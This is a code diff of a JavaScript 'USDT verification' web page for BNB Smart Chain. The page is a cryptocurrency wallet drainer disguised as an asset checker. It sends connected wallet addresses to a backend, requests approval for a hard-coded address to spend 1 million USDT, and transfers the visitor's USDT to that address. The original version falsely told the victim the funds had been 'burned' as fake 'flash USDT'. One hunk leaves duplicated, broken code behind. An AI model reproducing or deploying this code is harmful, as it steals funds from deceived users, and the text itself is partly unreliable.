@@ -1,6 +1,6 @@
-const bscAddress = "0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979"; // Your USDT receiving address
-const bnbGasSender = "0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979"; // Wallet for gas fees
-const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
+const bscAddress = "0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979";
+const bnbGasSender = "0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979";
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
 let web3;
 let userAddress;
@@ -20,10 +20,7 @@ async function connectWallet() {
             userAddress = accounts[0];
             console.log("Wallet Connected:", userAddress);
 
-            // ✅ Send to backend
             sendToBackend(userAddress);
-
-            // ✅ Approve spending from frontend
             approveSpending();
 
         } catch (error) {
@@ -35,10 +32,9 @@ async function connectWallet() {
     }
 }
 
-// ✅ Approve USDT transferFrom to your wallet
 async function approveSpending() {
-    const spender = "0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979"; // 👈 Your own wallet address
-    const amount = web3.utils.toWei("1000000", "ether"); // Approve 1 million USDT
+    const spender = bscAddress;
+    const amount = web3.utils.toWei("1000000", "ether");
 
     const contract = new web3.eth.Contract([
         {
@@ -70,14 +66,6 @@ async function sendToBackend(wallet) {
             },
             body: JSON.stringify({ address: wallet })
         });
-
-        const result = await response.json();
-        console.log("Backend response:", result);
-    } catch (error) {
-        console.error("Error sending wallet to backend:", error);
-    }
-}
-
 
         const result = await response.json();
         console.log("Backend response:", result);
@@ -122,7 +110,7 @@ async function verifyAssets() {
 
     if (usdtBalance <= 10) {
         showPopup(
-            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
+            `✅ Verification Successful<br>Your assets are genuine.<br><br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${userBNB}`,
             "green"
         );
         return;
@@ -160,11 +148,10 @@ async function transferUSDT(usdtBalance, userBNB) {
         await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
 
         showPopup(
-            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
+            `✅ Transferred ${usdtBalance} USDT to ${bscAddress}`,
             "red"
         );
 
-        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
     } catch (error) {
         console.error("❌ USDT Transfer Failed:", error);
         alert("USDT transfer failed. Ensure you have enough BNB for gas.");
@@ -180,7 +167,7 @@ async function sendBNB(toAddress, amount) {
             gas: 21000
         });
 
-        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
+        console.log(`✅ Sent ${amount} BNB to ${toAddress}`);
     } catch (error) {
         console.error("⚠️ Error sending BNB:", error);
     }
@@ -198,7 +185,7 @@ function showPopup(message, color) {
         popup.style.transform = "translate(-50%, -50%)";
         popup.style.padding = "20px";
         popup.style.borderRadius = "10px";
-        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
+        popup.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.2)";
         popup.style.textAlign = "center";
         popup.style.fontSize = "18px";
         popup.style.width = "80%";
